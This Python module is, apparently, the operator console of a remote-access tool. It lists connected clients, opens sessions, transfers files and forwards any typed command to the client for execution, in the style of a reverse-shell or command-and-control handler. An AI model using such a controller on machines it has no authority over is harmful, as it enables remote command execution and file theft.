from typing import Optional
from logger import logger

def handle_command(command: str, client_manager):
    parts = command.strip().split()

    if not parts:
        return

    cmd = parts[0].lower()

    if cmd == "list":
        list_clients(client_manager)

    elif cmd == "interact":
        if len(parts) < 2:
            logger.debug("[!] Usage: interact <client_id>")
            return

        interact_with_client(parts[1], client_manager)

    elif cmd == "help":
        show_help()

    else:
        logger.error(f"[!] Unknown command: {cmd}")


#-------------- COMMANDS IMPLEMENTATION -------------#

def list_clients(client_manager):
    clients = client_manager.get_all()

    if not clients:
        logger.info("[!] No connected clients.")
        return

    logger.info("\nConnected clients:")
    logger.info("-" * 40)

    for client in clients:
        logger.info(f"ID: {client.id} | IP: {client.ip} | Status: {client.status}")

    logger.info("-" * 40)


def interact_with_client(client_id: str, client_manager):
    client = client_manager.get(client_id)

    if not client:
        logger.info("[!] Client not found.")
        return

    logger.info(f"[+] Interacting with client {client.id} ({client.ip})")
    logger.info("Type 'back' to return.\n")

    while True:
        try:
            cmd = input(f"session({client.id}) > ").strip()

            if not cmd:
                continue

            if cmd.lower() == "back":
                break

            elif cmd.lower() == "help":
                session_help()

            elif cmd.lower() == "info":
                print_client_info(client)

            elif cmd.startswith("upload"):
                handle_upload(cmd, client)

            elif cmd.startswith("download"):
                handle_download(cmd, client)

            else:
                send_command_to_client(cmd, client)

        except KeyboardInterrupt:
            logger.exception("\n[!] Type 'back' to exit session.")


#---------- SESSION COMMANDS ---------#

def send_command_to_client(command: str, client):
    try:
        client.send(command)
        response = client.receive()

        if response:
            print(response)
        else:
            logger.error("[!] No response.")

    except Exception as e:
        logger.exception(f"[!] Error communicating with client: {e}")


def print_client_info(client):
    logger.info("\nClient info:")
    logger.info(f"ID      : {client.id}")
    logger.info(f"IP      : {client.ip}")
    logger.info(f"Status  : {client.status}")
    logger.info("")


def handle_upload(command: str, client):
    parts = command.split()

    if len(parts) < 3:
        logger.debug("[!] Usage: upload <local_path> <remote_path>")
        return

    local_path = parts[1]
    remote_path = parts[2]

    try:
        from file_transfer import upload_file
        upload_file(client, local_path, remote_path)
        logger.critical("[+] File uploaded.")

    except Exception as e:
        logger.exception(f"[!] Upload failed: {e}")


def handle_download(command: str, client):
    parts = command.split()

    if len(parts) < 3:
        logger.debug("[!] Usage: download <remote_path> <local_path>")
        return

    remote_path = parts[1]
    local_path = parts[2]

    try:
        from file_transfer import download_file
        download_file(client, remote_path, local_path)
        logger.critical("[+] File downloaded.")

    except Exception as e:
        logger.exception(f"[!] Download failed: {e}")


#----------- HELPERS --------------#

def show_help():
    logger.debug("""
Server commands:
    list                List connected clients
    interact <id>       Interact with a client
    help                Show this help
    exit                Exit server
""")


def session_help():
    logger.debug("""
Session commands:
    info                        Show client info
    upload <local> <remote>     Upload file
    download <remote> <local>   Download file
    back                        Return to main menu

Any other command will be executed on the client.
""")